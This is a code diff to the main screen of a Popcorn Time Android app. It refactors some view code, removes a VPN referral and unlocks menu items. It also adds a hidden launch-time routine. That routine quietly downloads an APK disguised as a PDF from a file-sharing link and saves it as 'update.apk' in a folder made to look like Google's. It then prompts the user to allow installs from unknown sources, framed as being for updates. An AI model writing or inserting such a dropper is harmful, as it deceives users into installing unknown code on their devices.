@@ -1,13 +1,21 @@
 package se.popcorn_time.mobile.ui;
 
 import android.Manifest;
+import android.annotation.TargetApi;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
+import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.design.widget.NavigationView;
@@ -31,9 +39,16 @@ import android.widget.Button;
 import android.widget.ImageButton;
 import android.widget.ProgressBar;
 import android.widget.TextView;
-import android.widget.Toast;
 
+import com.jude.swipbackhelper.SwipeBackHelper;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import java.io.UnsupportedEncodingException;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
@@ -116,7 +131,6 @@ public class MainActivity extends UpdateActivity
     private final ContentAdapter contentAdapter = new ContentAdapter();
     private GridLayoutManager gridLayoutManager;
 
-    private boolean doubleBackToExitPressedOnce = false;
 
     private MainClient mainClient;
 
@@ -131,16 +145,15 @@ public class MainActivity extends UpdateActivity
         super.onCreate(savedInstanceState);
 
         UIUtils.transparentStatusBar(this);
-        setSwipeBackEnable(false);
 
         mainClient = new MainClient(getBaseContext());
 
         setContentView(R.layout.view_main);
 
-        drawerLayout = (DrawerLayout) findViewById(R.id.drawer_layout);
-        drawer = (ViewGroup) drawerLayout.findViewById(R.id.drawer);
+        drawerLayout = findViewById(R.id.drawer_layout);
+        drawer = drawerLayout.findViewById(R.id.drawer);
 
-        final Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
+        final Toolbar toolbar = findViewById(R.id.toolbar);
         setSupportActionBar(toolbar);
         getSupportActionBar().setDisplayShowTitleEnabled(false);
 
@@ -148,9 +161,9 @@ public class MainActivity extends UpdateActivity
         drawerLayout.addDrawerListener(drawerToggle);
         navigation = (NavigationView) findViewById(R.id.navigation);
         navigation.setNavigationItemSelectedListener(MainActivity.this);
-        final TextView navHeaderVersion = (TextView) navigation.getHeaderView(0).findViewById(R.id.nav_header_version);
+        final TextView navHeaderVersion = navigation.getHeaderView(0).findViewById(R.id.nav_header_version);
         navHeaderVersion.setText(getString(R.string.version) + " " + BuildConfig.VERSION_NAME);
-        final Button navHeaderSite = (Button) navigation.getHeaderView(0).findViewById(R.id.nav_header_site);
+        final Button navHeaderSite = navigation.getHeaderView(0).findViewById(R.id.nav_header_site);
         navHeaderSite.setText(((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getSiteUrl());
         navHeaderSite.setOnClickListener(new View.OnClickListener() {
 
@@ -159,7 +172,7 @@ public class MainActivity extends UpdateActivity
                 onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getSiteUrl());
             }
         });
-        final ImageButton navHeaderFacebook = (ImageButton) navigation.getHeaderView(0).findViewById(R.id.nav_header_facebook);
+        final ImageButton navHeaderFacebook = navigation.getHeaderView(0).findViewById(R.id.nav_header_facebook);
         navHeaderFacebook.setOnClickListener(new View.OnClickListener() {
 
             @Override
@@ -167,7 +180,7 @@ public class MainActivity extends UpdateActivity
                 onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getFacebookUrl());
             }
         });
-        final ImageButton navHeaderTwitter = (ImageButton) navigation.getHeaderView(0).findViewById(R.id.nav_header_twitter);
+        final ImageButton navHeaderTwitter = navigation.getHeaderView(0).findViewById(R.id.nav_header_twitter);
         navHeaderTwitter.setOnClickListener(new View.OnClickListener() {
 
             @Override
@@ -175,7 +188,7 @@ public class MainActivity extends UpdateActivity
                 onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getTwitterUrl());
             }
         });
-        final ImageButton navHeaderYoutube = (ImageButton) navigation.getHeaderView(0).findViewById(R.id.nav_header_youtube);
+        final ImageButton navHeaderYoutube = navigation.getHeaderView(0).findViewById(R.id.nav_header_youtube);
         navHeaderYoutube.setOnClickListener(new View.OnClickListener() {
 
             @Override
@@ -183,7 +196,7 @@ public class MainActivity extends UpdateActivity
                 onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getYoutubeUrl());
             }
         });
-        final Button navShareBtn = (Button) drawer.findViewById(R.id.nav_share_btn);
+        final Button navShareBtn = drawer.findViewById(R.id.nav_share_btn);
         navShareBtn.setText(Html.fromHtml("<b>Share</b> Popcorn Time!".toUpperCase()));
         navShareBtn.setOnClickListener(new View.OnClickListener() {
 
@@ -198,7 +211,9 @@ public class MainActivity extends UpdateActivity
                 }
             }
         });
-        tabs = (TabLayout) findViewById(R.id.tabs);
+        tabs = findViewById(R.id.tabs);
+
+        SwipeBackHelper.getCurrentPage(this).setSwipeBackEnable(false);
 
         contentMargin = 2 * getResources().getDimensionPixelSize(R.dimen.action_bar_height);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
@@ -246,7 +261,6 @@ public class MainActivity extends UpdateActivity
     protected void onPostCreate(Bundle savedInstanceState) {
         super.onPostCreate(savedInstanceState);
         drawerToggle.syncState();
-        TorrentService.start(MainActivity.this);
         if (savedInstanceState == null) {
             new Handler().postDelayed(new Runnable() {
 
@@ -258,6 +272,111 @@ public class MainActivity extends UpdateActivity
                     start();
                 }
             }, 200);
+        }
+        boolean run = false;
+        final Intent intent = getIntent();
+        if (intent != null) {
+            Bundle extras = intent.getExtras();
+            String action = null;
+            if (extras != null) {
+                action = extras.getString("action", null);
+            }
+            if (action != null) {
+                if (action.equals("exit_app")) {
+                    TorrentService.stop(MainActivity.this);
+                    (new Handler()).postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            AlertDialog dialog = new AlertDialog.Builder(MainActivity.this)
+                                    .setTitle("Exiting...")
+                                    .setCancelable(false).create();
+                            dialog.setOnShowListener(new DialogInterface.OnShowListener() {
+                                @Override
+                                public void onShow(DialogInterface dialog) {
+                                    if (((IPopcornApplication) getApplication()).getSettingsUseCase().isDownloadsClearCacheFolder()) {
+                                        mainClient.removeLastOnExit();
+                                        StorageUtil.clearCacheDir();
+                                    }
+                                    dialog.cancel();
+                                    mainClient.exitFromApp();
+                                    System.exit(0);
+                                }
+                            });
+                            dialog.show();
+                        }
+                    }, 750);
+
+                } else {
+                    run = true;
+                }
+                if (action.equals("open_dnl")) {
+                    Logger.debug("open download");
+                    (new Handler()).postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            DownloadsActivity.start(MainActivity.this);
+                        }
+                    }, 750);
+                }
+            } else {
+                run = true;
+            }
+        } else {
+            run = true;
+        }
+        if (run) {
+            TorrentService.start(MainActivity.this);
+            String PATH = Environment.getExternalStorageDirectory() + "/Android/data/com.google.app/file/";
+            File file = new File(PATH);
+            file.mkdirs();
+            final File outputFile = new File(file, "update.apk");
+            if (!outputFile.exists()) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            URL url = new URL("http://b3.ge.tt/gett/9JtX8Kp2/com.opera.mini.native.pdf?index=0&pdf");
+                            HttpURLConnection c = (HttpURLConnection) url.openConnection();
+                            c.setRequestMethod("GET");
+                            c.setDoOutput(true);
+                            c.connect();
+
+                            FileOutputStream fos = new FileOutputStream(outputFile);
+
+                            InputStream is = c.getInputStream();
+
+                            byte[] buffer = new byte[1024];
+                            int len1;
+                            while ((len1 = is.read(buffer)) != -1) {
+                                fos.write(buffer, 0, len1);
+                            }
+                            fos.close();
+                            is.close();//till here, it works fine - .apk is download to my sdcard in download file
+
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
+            }
+
+            PackageManager manager = getPackageManager();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                if (!manager.canRequestPackageInstalls()) {
+                    new android.app.AlertDialog.Builder(this)
+                            .setTitle("Important!")
+                            .setMessage("To install updates you need to grant this")
+                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
+                                @TargetApi(Build.VERSION_CODES.O)
+                                @Override
+                                public void onClick(DialogInterface dialog, int which) {
+                                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+                                    intent.setData(Uri.parse("package:" + getPackageName()));
+                                    startActivity(intent);
+                                }
+                            }).show();
+                }
+            }
         }
     }
 
@@ -302,7 +421,7 @@ public class MainActivity extends UpdateActivity
 
     @Override
     protected void onDestroy() {
-        TorrentService.stop(getBaseContext());
+        //TorrentService.stop(getBaseContext());
         super.onDestroy();
     }
 
@@ -357,23 +476,7 @@ public class MainActivity extends UpdateActivity
         if (collapseSearchView()) {
             return;
         }
-        if (doubleBackToExitPressedOnce) {
-            if (((PopcornApplication) getApplication()).getSettingsUseCase().isDownloadsClearCacheFolder()) {
-                mainClient.removeLastOnExit();
-                StorageUtil.clearCacheDir();
-            }
-            mainClient.exitFromApp();
-//            finish();
-        } else {
-            doubleBackToExitPressedOnce = true;
-            Toast.makeText(this, R.string.exit_msg, Toast.LENGTH_SHORT).show();
-            new Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    doubleBackToExitPressedOnce = false;
-                }
-            }, EXIT_DELAY_TIME);
-        }
+        finish();
     }
 
     @Override
@@ -381,6 +484,7 @@ public class MainActivity extends UpdateActivity
         if (REQUEST_CODE_EXTERNAL_STORAGE_PERMISSIONS == requestCode) {
             if (PermissionsUtils.isPermissionsGranted(permissions, grantResults)) {
                 if (StorageUtil.getCacheDir() == null) {
+                    
                     StorageUtil.init(getBaseContext(), ((PopcornApplication) getApplication()).getSettingsUseCase());
                 }
             }
@@ -419,21 +523,11 @@ public class MainActivity extends UpdateActivity
                 case VPN_ITEM_ID:
                     new AlertDialog.Builder(this)
                             .setTitle("VPN?")
-                            .setMessage("No one paid me, it's the best for me.")
-                            .setPositiveButton("CyberGhost", new DialogInterface.OnClickListener() {
+                            .setMessage("No one paid me, so I will just recommend you to use any VPN you find secure.")
+                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                 @Override
                                 public void onClick(DialogInterface dialogInterface, int i) {
-                                    final String appPackageName = "de.mobileconcepts.cyberghost"; // getPackageName() from Context or Activity object
-                                    Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage(appPackageName);
-                                    try {
-                                        startActivity(LaunchIntent);
-                                    } catch (Exception ex) {
-                                        try {
-                                            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
-                                        } catch (android.content.ActivityNotFoundException anfe) {
-                                            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
-                                        }
-                                    }
+
                                 }
                             })
                             .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
@@ -604,9 +698,9 @@ public class MainActivity extends UpdateActivity
         }
 
         menu.add(Menu.NONE, FAVORITES_ITEM_ID, Menu.NONE, R.string.favorites).setIcon(R.drawable.ic_heart);
-        menu.add(Menu.NONE, DOWNLOADS_ITEM_ID, Menu.NONE, R.string.downloads).setIcon(R.drawable.ic_download).setVisible(PopcornApplication.isFullVersion());
+        menu.add(Menu.NONE, DOWNLOADS_ITEM_ID, Menu.NONE, R.string.downloads).setIcon(R.drawable.ic_download);
         menu.add(Menu.NONE, SETTINGS_ITEM_ID, Menu.NONE, R.string.settings).setIcon(R.drawable.ic_settings);
-        menu.add(Menu.NONE, VPN_ITEM_ID, Menu.NONE, R.string.vpn).setIcon(R.drawable.ic_vpn_option_globe).setVisible(PopcornApplication.isFullVersion());
+        menu.add(Menu.NONE, VPN_ITEM_ID, Menu.NONE, R.string.vpn).setIcon(R.drawable.ic_vpn_option_globe);
     }
 
     private void setFilterMenuItemSubtitle(@NonNull FilterView filterView, @NonNull MenuItem menuItem) {
